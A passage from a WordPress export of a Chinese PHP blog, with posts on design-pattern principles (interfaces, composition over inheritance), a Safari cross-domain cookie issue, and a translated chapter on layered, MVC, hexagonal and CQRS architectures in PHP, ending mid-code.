</code></pre><p>利用一个抽象类的两个不同实现，可以看到，这里所说的“按接口编程”实际上是指类的接口，而不是使用关键字interface定义的接口结构。最后，Client类建立了一个包含代码提示的方法，指定这个抽象类作为接口：</p><pre><code>class Client
{
    public function __construct()
    {
        $north = new NorthRegion;
        $west = new WestRegion;
        $this-&gt;showInterface($north);
        $this-&gt;showInterface($west);
    }
    private function showInterface(IAbstract $region)
    {
        echo $region-&gt;displayShow().'&lt;br&gt;';
    }
}
$worker = new Client();</code></pre><p>最终输出结果：</p><pre><code>Cost: $210.54 for Moose Breath
Cost: $105.27 for Rattlesnake Gulch</code></pre><p>对于不同的地区，结果值是不同的，因为两个具体类<code>NorthRegion</code>和<code>WestRegion</code>分别采用了不同方式来实现这个抽象方法。如果使用了一个不正确的数据类型，则会报错。</p><p>所以，就其自身而言，类型提示可以帮助你尽可能遵守第一个设计模式原则，即按接口而不是按实现来编程。</p><p>如果想了解这种编程风格的好处，可以增加<code>IAbstract</code>抽象类的实现，并增加到Client类中，可以看到，只要保持接口一致，完成增补和修改很容易。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>544</wp:post_id>
		<wp:post_date><![CDATA[2015-12-21 14:02:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-21 14:02:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[544]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="sjms"><![CDATA[设计模式]]></category>
		<category domain="post_tag" nicename="%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f"><![CDATA[设计模式]]></category>
						</item>
					<item>
		<title>设计模式笔记：第二个设计模式原则——优先选择组合而非继承</title>
		<link>http://wp.veitor.net/2015/12/23/547/</link>
		<pubDate>Wed, 23 Dec 2015 14:18:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=547</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;<img src="http://storage.veitor.net/2015/12/3282518938.jpg" alt="QQ截图20151223224240.jpg" title="QQ截图20151223224240.jpg"></p><p>有些OOP程序员认为对象重用、扩展就等同于使用继承。一个类可以有大量属性和方法，通过继承这个类，我们增加新属性和方法，就能轻松的进行扩展，因为无需再重新编写代码。不过最后对于紧密绑定的对象，一味的使用继承方式来扩展会导致这么一个问题，那就是<strong>过度继承</strong>。</p><!--more--><p>所以这里要讲的就是第二个设计模式原则：<strong>应当优先选择对象组合而不是类继承</strong></p><p>那么对象组合与继承有什么区别呢？这个说法并不是要完全消除继承。实际上，这个表示开发程序时如果有机会使用组合，就应当优先使用组合而不是继承。这样一来，子类就不会因为继承到大量不用的属性和方法而变得过度膨胀。</p><p>下面通过一个简单例子来说明一下，首先看使用继承的代码，父类是一个简单的类，包含两个方法来完成加法和除法：</p><pre><code>class DoMath
{
    private $sum;
    private $quotient;
    public function simpleAdd($first, $second)
    {
        $this-&gt;sum = ($first+$second);
        return $this-&gt;sum;
    }
    public function simpleDivide($dividend, $divisor)
    {
        $this-&gt;quotient = ($dividend/$divisor);
        return $this-&gt;quotient;
    }
}</code></pre><p>子类用于增加文本功能，一个方法是将数字转换为字符串，另一个方法是建立一个格式化输出。这个类通过继承DoMath的方式扩展了所有功能：</p><pre><code>class InheritMath extends DoMath
{
    private $textOut;
    private $fullFace;
    public function numToText($num)
    {
        $this-&gt;textOut = (string)$num;
        return $this-&gt;textOut;
    }
    public function addFace($face, $msg)
    {
        $this-&gt;fullFace = &quot;&lt;strong&gt;&quot; . $face . &quot;&lt;/strong&gt;&quot; . $msg;
        return $fullFace;
    }
}</code></pre><p>最后实例化InheritMath类，使用实例化的对象不仅能够使用DoMath类中的所有功能，还能使用InheritMath类中新增的功能：</p><pre><code>$family = new InheritMath();
$added = $family-&gt;simpleAdd(40,60);
$divided = $family-&gt;simpleDivide($added, 25);
$textNum = $family-&gt;numToText($divided);
$output = $family-&gt;addFace(&quot;Your results&quot;,$textNum);
echo $output;
//输出结果
Your results:4</code></pre><p>接着再来看一下组合使用的代码，其中一个类依然是上面例子中的DoMath，另一个类是：</p><pre><code>class DoText
{
    private $textOut;
    private $fullFace;
    public function numToText($num)
    {
        $this-&gt;textOut = (string)$num;
        return $this-&gt;textOut;
    }
    public function addFace($face, $msg)
    {
        $this-&gt;fullFace = &quot;&lt;strong&gt;&quot; . $face . &quot;&lt;/strong&gt;&quot; . $msg;
        return $fullFace;
    }
}</code></pre><p>这个DoText类与InheritMath类很相似，它们的区别仅仅就是一个继承了DoMath类，一个没有继承。</p><p>然后通过组合方式来使用这两个类：</p><pre><code>$math = new DoMath();
$text = new DoText();
$added = $math-&gt;simpleAdd(40,60);
$divided = $math-&gt;simpleDivide($added, 25);
$textNum = $text-&gt;numToText($divided);
$output = $text-&gt;addFace(&quot;Your results&quot;,$textNum);
echo $output;
//输出结果
Your results:4</code></pre><p>结果完全相同，不过这么做需要多包含一个类，并且多实例化一个类。看起来继承似乎更胜一筹，不过在较大的程序中，组合可以避免维护多个继承层次上的各个子类，而且还可以避免可能导致的错误。比如，父类的一个改变会逐级乡下传递到子类的实现，这可能会影响子类使用，如果继承过深，那么继承那么多的子类都可能要去进行相应的修改，那将是一个蛋疼的事情啊。</p><p>所以说，不是不能使用继承，而是尽量优先选择组合，并且使用继承的话，要尽量避免过度继承，要使用浅继承。主要还是避免类之间的紧密绑定。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>547</wp:post_id>
		<wp:post_date><![CDATA[2015-12-23 14:18:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-23 14:18:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[547]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="sjms"><![CDATA[设计模式]]></category>
		<category domain="post_tag" nicename="%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f"><![CDATA[设计模式]]></category>
						</item>
					<item>
		<title>记一次Safari中无法跨域设置cookie的坑</title>
		<link>http://wp.veitor.net/2018/04/03/551/</link>
		<pubDate>Tue, 03 Apr 2018 06:46:14 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=551</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;问题重现步骤：<br />有两个不同域名的页面a.com/a.php和b.com/a.php两个域名，其中b.com/a.php会在其<code>b.com</code>下设置cookie，a.com/a.php页面中通过<code>iframe</code>或<code>script src</code>等方式嵌入b.com/a.php页面。保持b.com下的cookie为空，正常chrome等浏览器访问a.com/a.php时，嵌入的b.com/a.php可以正常对<code>b.com</code>域名下设置cookie，而safari中设置不了。</p><p>一开始以为是自己在b.com页面中设置cookie方式有问题，对cookie的name、value、expire、path、secure、httponly等都检查了好多次都没找出原因。并且当时会出现偶尔可以设置偶尔不可以设置的现象，后来逐一条件排查下来是要在b.com域名下cookie清空的条件下会产生这问题，如果b.com下有任意的一个或多个cookie项，那么safari就能正常写进去。</p><p>我主要是在iphone上进行的测试，后经查也有人反馈在pc上的safari也有这问题，那最后基本可以定位这问题的原因了。<br />试过通过在b.com下设置各种cors header头，加各种P3P header均没有效果。<br />这估计还是因为safari的cookie策略导致的。。最后。。只能根据问题现象，使用很屎的中转办法了，提前在b.com下设置任意一个cookie来确保该域名下至少有cookie，后续才能设置成功。</p><p>查找过的相关文章：<br /><a href="https://blog.csdn.net/zhx19920405/article/details/51417250">https://blog.csdn.net/zhx19920405/article/details/51417250</a><br /><a href="https://stackoverflow.com/questions/32713992/safari-does-not-allowed-cross-domain-cookies-in-iframe">https://stackoverflow.com/questions/32713992/safari-does-not-allowed-cross-domain-cookies-in-iframe</a></p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>551</wp:post_id>
		<wp:post_date><![CDATA[2018-04-03 06:46:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-04-03 06:46:14]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[551]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="iphone"><![CDATA[iphone]]></category>
		<category domain="post_tag" nicename="safari"><![CDATA[safari]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>[译]架构风格 - 《Domain-Driven Design in PHP》第2章</title>
		<link>http://wp.veitor.net/2018/04/19/553/</link>
		<pubDate>Thu, 19 Apr 2018 13:27:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=553</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;&gt; 本篇博文由本博客(<code>http://www.veitor.net</code>)经原文翻译，转载请注明出处。</p><p>为了能够构建一个复杂的应用程序，其中一个关键点就是需要有一个适合该程序的架构设计。领域驱动设计的一个优势就是它不受任何架构风格的约束。相反，我们可以自由的去为核心领域内的每一个限界上下文选择最合适的架构，为每一个领域问题提供多种架构选择。</p><!--more--><p>例如，订单处理系统可以使用事件溯源(Event Sourcing)去追踪所有不同订单的操作；一个产品目录系统能够使用CQRS去将产品详情展示给不同客户端；一个内容管理系统能使用六边形架构(Hexagonal Architecture)来展示如博客、静态页等需求。</p><p>本章将介绍PHP相关的每种架构风格，从传统PHP代码演变为复杂的架构。请注意虽然还有很多其他现有的架构如Data Fabric和SOA，我们发现他们其中一些从PHP角度来介绍太过于复杂。</p><h2>曾经的美好时光</h2><p>在PHP4发布之前，该语言还不支持面向对象。那时，写程序的通用做法是使用过程式编程和全局状态。在PHP社区中像关注点分离(Separation of Concerns,SoC)和MVC这些概念还是比较陌生的。</p><p>下面的例子是以这种传统方式编写的应用程序，由许多与HTML代码混合的前端控制器组成。在这时，基础设施、UI和领域层代码混在一起：</p><pre><code class="lang-php">&lt;?php
include __DIR__ . '/bootstrap.php';
$link = mysql_connect('localhost', 'a_username', '4_p4ssw0rd');
if (!$link) {
    die('Could not connect: ' . mysql_error());
}
mysql_set_charset('utf8', $link);
mysql_select_db('my_database', $link);
$errormsg = null;
if (isset($_POST['submit'] &amp;&amp; isValid($_POST['post'])) {
    $post = getFrom($_POST['post']);
    mysql_query('START TRANSACTION', $link);
    $sql = sprintf(&quot;INSERT INTO posts (title, content) VALUES ('%s','%s')&quot;, mysql_real_escape_string($post['title']), mysql_real_escape_string($post['content']));
    $result = mysql_query($sql, $link);
    if ($result) {
        mysql_query('COMMIT', $link);
    } else {
        mysql_query('ROLLBACK', $link);
        $errormsg = 'Post could not be created! :(';
    }
}
$result = mysql_query('SELECT id, title, content FROM posts', $link);
?&gt;
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;?php if (null !== $errormsg): ?&gt;
&lt;div class=&quot;alert error&quot;&gt;&lt;?php echo $errormsg; ?&gt;&lt;/div&gt;
&lt;?php
else: ?&gt;
&lt;div class=&quot;alert success&quot;&gt;
Bravo! Post was created successfully!
&lt;/div&gt;
&lt;?php
endif; ?&gt;
&lt;table&gt;
&lt;thead&gt;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;TITLE&lt;/th&gt;
&lt;th&gt;ACTIONS&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;
&lt;tbody&gt;
&lt;?php while ($post = mysql_fetch_assoc($result)): ?&gt;
&lt;tr&gt;
&lt;td&gt;&lt;?php echo $post['id']; ?&gt;&lt;/td&gt;
&lt;td&gt;&lt;?php echo $post['title']; ?&gt;&lt;/td&gt;
&lt;td&gt;&lt;?php editPostUrl($post['id']); ?&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;?php
endwhile; ?&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php mysql_close($link); ?&gt;</code></pre><p>这种编码方式通常被称为第1章中提到的“大泥球”。然而，这种风格改进似乎是将网页头部和底部封装到各自的文件中，然后在该页面中再引入进来。这就避免了重复劳动并且能有效复用。</p><pre><code class="lang-php">&lt;?php
include __DIR__ . '/bootstrap.php';
$link = mysql_connect('localhost', 'a_username', '4_p4ssw0rd');
if (!$link) {
    die('Could not connect: ' . mysql_error());
}
mysql_set_charset('utf8', $link);
mysql_select_db('my_database', $link);
$errormsg = null;
if (isset($_POST['submit'] &amp;&amp; isValid($_POST['post'])) {
    $post = getFrom($_POST['post']);
    mysql_query('START TRANSACTION', $link);
    $sql = sprintf(&quot;INSERT INTO posts(title, content) VALUES('%s','%s')&quot;, mysql_real_escape_string($post['title']), mysql_real_escape_string($post['content']));
    $result = mysql_query($sql, $link);
    if ($result) {
        mysql_query('COMMIT', $link);
    } else {
        mysql_query('ROLLBACK', $link);
        $errormsg = 'Post could not be created! :(';
    }
    $result = mysql_query('SELECT id, title, content FROM posts', $link);
?&gt;
&lt;?php include __DIR__ . '/header.php'; ?&gt;
&lt;?php if (null !== $errormsg): ?&gt;
&lt;div class=&quot;alert error&quot;&gt;&lt;?php echo $errormsg; ?&gt;&lt;/div&gt;
&lt;?php
    else: ?&gt;
&lt;div class=&quot;alert success&quot;&gt;
Bravo! Post was created successfully!
&lt;/div&gt;
&lt;?php
    endif; ?&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;TITLE&lt;/th&gt;
&lt;th&gt;ACTIONS&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;?php while ($post = mysql_fetch_assoc($result)): ?&gt;
&lt;tr&gt;
&lt;td&gt;&lt;?php echo $post['id']; ?&gt;&lt;/td&gt;
&lt;td&gt;&lt;?php echo $post['title']; ?&gt;&lt;/td&gt;
&lt;td&gt;&lt;?php editPostUrl($post['id']); ?&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;?php
    endwhile; ?&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;?php include __DIR__ . '/footer.php'; ?&gt;</code></pre><p>如今，尽管这样非常的不推荐，但仍然有这种过程式编程的程序存在。这种架构风格的主要缺点就是没有做到关注点分离，用这种方式开发的程序在维护成本上比我们现在所知道并经过验证的架构高多了。</p><h2>分层架构</h2><p>从代码可维护性和复用性角度来看，让代码更容易维护的最好方法就是分解概念，也就是为每个不同的关注点创建一个层。在我们前面的例子中，很容易形成不同的分层：一个用于封装数据访问和操作，另一个处理基础设施问题，还有最后一个负责前两者的协调调用。分层架构的一个基本规则就是每一层必须与其下一层紧密耦合，如下图所示：</p><p><img src="http://storage.veitor.net/2018/04/1535675639.jpg" alt="QQ截图20180419221418.jpg" title="QQ截图20180419221418.jpg"></p><p>分层架构真正寻求的是分离应用程序的不同组件。比如前一个例子，一篇博文的展现必须与这篇博文的概念实体完全分离。一个博文实体可以与多个展现相关联，而不是与特定的展现紧耦合。这通常被称为关注点分离(Separation of Concerns)。</p><p>另一个寻求相同目的的架构模式是MVC模式。它最初被认为广泛用于构建桌面GUI应用程序的，现在主要用于web应用程序，这要归功于像Symfony、Yii、CodeIgniter等这样的流行web框架。</p><h3>Model-View-Controller</h3><p>MVC架构模式将应用分成了3层，具体描述如下：</p><ul><li>模型(Model)：捕获和集中所有领域模型的行为。这一层独立于数据展示，来管理所有的数据、逻辑和业务规则。模型层被称为是MVC应用的灵魂与核心。</li><li>控制器(Controller)：协调其他层的交互，触发模型上的动作来更改模型的状态，并且刷新与该模型关联的展现。除此之外，控制器可以将消息发送到是视图层来更改指定模型的展示。</li><li>视图(View)：将模型层的不同展示表现出来，并且提供一个方式去改变模型状态。<br /><img src="http://storage.veitor.net/2018/04/3390319868.jpg" alt="QQ截图20180419224352.jpg" title="QQ截图20180419224352.jpg"></li></ul><h3>分层架构示例</h3><h4>模型</h4><p>继续前面的例子，我们提到不同关注点应该被分离。为了做到这一点，所有的层应该在我们杂乱的代码中进行确定。在这过程中，我们需要特别注意符合我们模型层的代码，其将成为我们应用的核心。</p><pre><code class="lang-php">&lt;?php
class Post {
    private $title;
    private $content;
    public static function writeNewFrom($title, $content) {
        return new static($title, $content);
    }
    private function __construct($title, $content) {
        $this-&gt;setTitle($title);
        $this-&gt;setContent($content);
    }
    private function setTitle($title) {
        if (empty($title)) {
            throw new RuntimeException('Title cannot be empty');
        }
        $this-&gt;title = $title;
    }
    private function setContent($content) {
        if (empty($content)) {
            throw new RuntimeException('Content cannot be empty');
        }
        $this-&gt;content = $content;
    }
}
class PostRepository {
    private $db;
    public function __construct() {
        $this-&gt;db = new PDO(
            'mysql:host=localhost;dbname=my_database',
            'a_username',
            '4_p4ssw0rd',
            [
                PDO::MYSQL_ATTR_INIT_COMMAND =&gt;
                                'SET NAMES utf8mb4'
            ]
        );
    }
    public function add(Post $post) {
        $this-&gt;db-&gt;beginTransaction();
        try {
            $stm = $this-&gt;db-&gt;prepare(
                  'INSERT INTO posts (title, content) VALUES (?, ?)'
            );
            $stm-&gt;execute([
                $post-&gt;title(),
                $post-&gt;content()
            ]);
            $this-&gt;db-&gt;commit();
        } catch (Exception $e) {
            $this-&gt;db-&gt;rollback();
            throw new UnableToCreatePostException($e);
        }
    }
}</code></pre><p>模型层现在已经由<code>Post</code>类和<code>PostRepository</code>类来定义。<code>Post</code>类代表一篇博文，<code>PostRepository</code>类代表整个博文的集合。另外，模型内部还需要另一个层（协调和编排领域模型行为的层）。进入应用层(Application Layer)：</p><pre><code class="lang-php">&lt;?php
class PostService {
    public function createPost($title, $content) {
        $post = Post::writeNewFrom($title, $content);
        (new PostRepository())-&gt;add($post);
        return $post;
    }
}
</code></pre><p><code>PostService</code>类是所谓的应用服务(Application Service)，它的目的是协调和编排领域行为。换句话说，Application Service是让事情发生的东西，它是领域模型的直接客户端。没有其他对象类型能够直接与模型层的内部层进行交流。</p><h4>视图</h4><p>视图层可以同时从模型层或者控制器层发送和接收消息。它的主要目的是在UI层面将模型展示给用户，而且每次模型更新它都将刷新UI展示。一般来说，视图层接收一个对象（通常是数据转换对象,Data Transfer Object,DTO）而不是模型层的实例对象，从而将收集到所需的信息成功展示。对于PHP，这有一些模板引擎能够很好的帮助将模型展示与模型和控制器分离，目前较流行的是<code>Twig</code>。让我们看一下使用Twig的视图层是怎么样的。</p><blockquote><p>使用DTO而不是模型实例？<br />这是一个旧的活跃话题。为什么是创建一个DTO而不是直接将模型实例对象给视图层？主要原因和简要的回答还是：关注点分离。让视图检查和使用模型实例将导致视图层和模型层的紧耦合。事实上，模型层的一个改动可能将影响所有使用该模型实例的视图。</p></blockquote><pre><code class="lang-html">{% extends &quot;base.html.twig&quot; %} {% block content %} {% if errormsg is defined %}
&lt;div class=&quot;alert error&quot;&gt;{{ errormsg }}&lt;/div&gt;
{% else %}
&lt;div class=&quot;alert success&quot;&gt;
  Bravo! Post was created successfully!
&lt;/div&gt;
{% endif %}
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ID&lt;/th&gt;
      &lt;th&gt;TITLE&lt;/th&gt;
      &lt;th&gt;ACTIONS&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    {% for post in posts %}
    &lt;tr&gt;
      &lt;td&gt;{{ post.id }}&lt;/td&gt;
      &lt;td&gt;{{ post.title }}&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;{{ editPostUrl(post.id) }}&quot;&gt;Edit Post&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    {% endfor %}
  &lt;/tbody&gt;
&lt;/table&gt;
{% endblock %}</code></pre><p>大多数时间，当模型触发更改状态时，它也会通知相关的视图刷新UI。在典型的web场景中，由于客户端和服务端的特性，模型和其展示在同步变化时有些困难。在这类环境中，一些javascript定义的交互需要来维持这种同步变化，所以像下面的几个javascript的MVC框架近几年开始流行起来：</p><ul><li>AngularJS</li><li>Ember.ks</li><li>Marionette.js</li><li>React</li></ul><h4>控制器</h4><p>控制器负责组织和协调视图和模型，它从视图层接收信息并触发模型的行为来做一些需要的操作。此外，它还发送信息到视图层以展示模型。这两个操作都由应用层来执行，应用层负责编排、组织和封装领域行为。</p><p>就PHP中的web程序而言，控制器通常会被理解成一组class类来实现其目的。它们接收HTTP请求并返回一个HTTP响应。</p><pre><code class="lang-php">&lt;?php
class PostsController {
    public function updateAction(Request $request) {
        if ($request-&gt;request-&gt;has('submit') &amp;&amp; Validator::validate($request-&gt;request-&gt;post)) {
            $postService = new PostService();
            try {
                $postService-&gt;createPost($request-&gt;request-&gt;get('title'), $request-&gt;request-&gt;get('content'));
                $this-&gt;addFlash('notice', 'Post has been created successfully!');
            }
            catch(Exception $e) {
                $this-&gt;addFlash('error', 'Unable to create the post!');
            }
        }
        return $this-&gt;render('posts/update-result.html.twig');
    }
}</code></pre><h3>反转依赖：六边形架构</h3><p>遵循分层架构的基本规则，在实现包含基础设施的领域接口(interface)时会存在风险。</p><p>例如，在MVC中，前一个例子中的PostRepository类应该放在领域模型中。但是，直接将基础设施细节部分放在领域中会违反关注点分离原则，这是有问题的；很难去避免违反分层架构的基本规则，那将导致领域过多的了解到技术实现的部分，使得代码难以测试。</p><h4>依赖倒置原则（The Dependency Inversion Principle，DIP）</h4><p>我们如何去处理刚才的问题？由于领域模型层依赖于具体的基础设施实现，所以可以通过将基础设施层放到其他三个层之上，这样就用上了依赖倒置原则。</p><blockquote><p>依赖倒置原则<br />高级模块不应该依赖于低级模块，两者都应该依赖于抽象。<br />抽象不应该依赖于细节，细节也不应该依赖于抽象。</p></blockquote><p>通过使用依赖倒置原则，架构体系将发生改变，基础设施层（可称之为低级模块）现在依赖于视图UI层，应用层和领域层（这些是高级模块）。依赖性已经被倒置过来。</p><p>但什么是六边形架构？六边形架构（也称之为端口和适配器）由Alistair Cockburn在他的<a href="http://alistair.cockburn.us/Hexagonal+architecture">《六边形架构》</a>一书中定义。六边形架构将应用程序描述为六边形，其中每一个边都代表带有一个或多个适配器的端口（译者注：原文单词为Port），一个端口是一个带有可插入适配器的连接器，该连接器将外部输入信息转换成应用程序可以理解的内部信息。就DIP而言，一个端口将是一个高级模块，一个适配器将是一个低级模块。此外，如果应用程序需要将消息发送到外部，将使用带有适配器的端口来发送，并将信息转换为外部可理解的内容。因此，六边形架构在应用中提出了对称性的概念，这也是架构体系发生改变的主要原因。该架构通常被表示为六边形，因为谈论顶层和底层将不再具有意义，而是主要谈论外部和内部。</p><h4>应用六边形架构</h4><p>继续使用博客的例子，我们需要的第一个概念是外部与应用程序交流的端口。在这种情况下，我们将使用HTTP端口和对应的适配器，外部将使用该端口给应用程序发送信息。博客示例使用数据库来存储所有博客文章的集合，为了允许应用程序能从数据库检索文章，需要这么一个端口：</p><pre><code class="lang-php">interface PostRepository
{
  public function byId(PostId $id);
  public function add(Post $post);
}</code></pre><p>这个接口(interface)告诉了我们一个端口，应用程序将通过该端口获取博文信息，并且将该端口放置在了领域层，现在需要一个该端口的适配器。适配器负责使用特定技术来检索博文。</p><pre><code class="lang-php">&lt;?php
class PDOPostRepository implements PostRepository {
    private $db;
    public function __construct(PDO $db) {
        $this-&gt;db = $db;
    }
    public function byId(PostId $id) {
        $stm = $this-&gt;db-&gt;prepare('SELECT * FROM posts WHERE id = ?');
        $stm-&gt;execute([$id-&gt;id() ]);
        return recreateFrom($stm-&gt;fetch());
    }
    public function add(Post $post) {
        $stm = $this-&gt;db-&gt;prepare('INSERT INTO posts (title, content) VALUES (?, ?)');
        $stm-&gt;execute([$post-&gt;title(), $post-&gt;content(), ]);
    }
}</code></pre><p>一旦我们有了端口和对应的适配器，最后一步就是重构PostService来使用它们。通过依赖注入可以轻松的获得到：</p><pre><code class="lang-php">&lt;?php
class PostService {
    private $postRepository;
    public function __construct(PostRepositor $postRepository) {
        $this-&gt;postRepository = $postRepository;
    }
    public function createPost($title, $content) {
        $post = Post::writeNewFrom($title, $content);
        $this-&gt;postRepository-&gt;add($post);
        return $post;
    }
}</code></pre><p>这只是六边形架构的一个简单例子，这是一个灵活的架构，可以促进关注点的分离。由于通过端口，内部应用程序可以与外部通信，因此六边形架构还促进了对称性。从现在开始，我们将使用这个架构作为基础架构，来继续解释CQRS和事件溯源。</p><p>关于更多该架构的示例，你可以查看附录（译者注：暂无链接，后期会添加上）。有关更详细的示例，你应该跳到第11章应用程序(Application Service)，这一章解释了事务性和其他横切关注点等高级话题。</p><h3>命令查询责任分离（Command Query Responsibility Segregation，CQRS）</h3><p>六边形架构是一个很好的基础架构，但是也有一些局限性。例如，复杂的用户UI界面可能需要以多种形式来展示聚合信息（第8章，聚合），或者需要从多个聚合获取数据。在这种情况下，我们可能在仓储类中有很多finder方法（可能与UI界面一样多）。或者我们可能决定将这种复杂性的东西放到应用服务中，使用复杂结构来从多个聚合聚集所需要的数据。以下是一个示例：</p><pre><code class="lang-php">&lt;?php
interface PostRepository
{
    public function save(Post $post);
    public function byId(PostId $id);
    public function all();
    public function byCategory(CategoryId $categoryId);
    public function byTag(TagId $tagId);
    public function withComments(PostId $id);
    public function groupedByMonth();
// ...
}</code></pre><p>当这些技术被滥用时，UI视图的构建会变的相当痛苦。我们是让应用服务直接返回领域模型实例还是返回一类DTO？对此该做一些权衡。如果是后者，我们避免领域模型与基础设施代码（web控制器、命令行控制器等）的紧密耦合。</p><p>幸运的是，我们还有另一种方法。如果有多个并且不同的视图，我们将其从领域模型中去除，并看做是基础设施问题。命令查询分离(CQS)是一个基于设计原则的可选项，由Bertrand Meyer定义的，并且这催生了一个新的架构模式，称之为命令查询责任分离(CQRS)，由Greg Young定义。</p><blockquote><p>命令查询分离（Command Query Separation, CQS）<br />这个设计原则规定，每个方法应该是执行操作的命令，或者是一个返回数据给调用者的查询。不能同时是这两种。</p></blockquote><p>CQRS寻求一个更严格的关注点分离，将模型分为了两部分：</p><ul><li><em>写模型</em>：也被称为<em>命令模型</em>，它负责写入并对真正的领域行为负责。</li><li><em>读模型</em>：它负责在应用中的读取内容，并将这些内容认为是领域模型外的。</li></ul><p>每当有人触发写模型的命令时，就会执行写入数据的操作。此外，这还将触发读模型的更新，为了在读模型上展示最新的更改。</p><p>严格的分离将导致另一个问题：最终一致性。读模型的一致性受写模型命令的影响，换句话说，读模型是最终一致性。也就是当每一次的写模型执行一个命令，它将根据最新的更改拉起一个过程来负责更新读模型，这就将有一段时间内，用户UI界面是展示的旧的信息，这经常发生，因为我们受当前技术的限制。</p><p>思考一下web应用的缓存系统，每当数据库更新了新的信息，缓存里的数据可能还是旧的，所以每当数据更新，将有一个更新缓存的过程，缓存系统是最终一致性的。</p><p>这一类过程用CQRS术语来说就是写模型投影，或者叫投影。我们将写模型投影到读模型上，这个过程可以是同步的也可以是异步的，取决于你的需求。这将归功于另一个有用的战术设计模式——领域事件(Domain Events)，本书稍后将做详细解释。写模型投影的基础是收集所有已经发布的领域事件，并使用来自这些事件中的信息去更新读模型。</p><h4>写模型</h4><p>这是领域行为真正的持有者。继续我们的例子，Repository接口将被简化为：</p><pre><code class="lang-php">&lt;?php
interface PostRepository
{
    public function save(Post $post);
    public function byId(PostId $id);
}</code></pre><p><code>byId</code>方法负责通过id加载聚合以便能操作该聚合，除了这个方法之外，现在PostRepository类已经从所有的读取问题中解放出来了。一旦这个完成了，所有的查询方法也从Post模型中剥离了出来，只留下了命令方法，这意味着我们有效的摆脱了所有关于获取Post获取数据的方法。相反的，通过订阅领域事件，当事件发生时将会触发写模型投影。</p><pre><code class="lang-php">&lt;?php
class AggregateRoot
{
    private $recordedEvents = [];
    protected function recordApplyAndPublishThat(DomainEvent $domainEvent)
    {
        $this-&gt;recordThat($domainEvent);
        $this-&gt;applyThat($domainEvent);
        $this-&gt;publishThat($domainEvent);
    }
    protected function recordThat(DomainEvent $domainEvent)
    {
        $this-&gt;recordedEvents[] = $domainEvent;
    }
    protected function applyThat(DomainEvent $domainEvent)
    {
        $modifier = 'apply' . get_class($domainEvent);
        $this-&gt;{$modifier}($domainEvent);
    }
    protected function publishThat(DomainEvent $domainEvent)
    {
        DomainEventPublisher::getInstance()-&gt;publish($domainEvent);
    }
    public function recordedEvents()
    {
        return $this-&gt;recordedEvents;
    }
    public function clearEvents()
    {
        $this-&gt;recordedEvents = [];
    }
}
class Post extends AggregateRoot
{
    private $id;
    private $title;
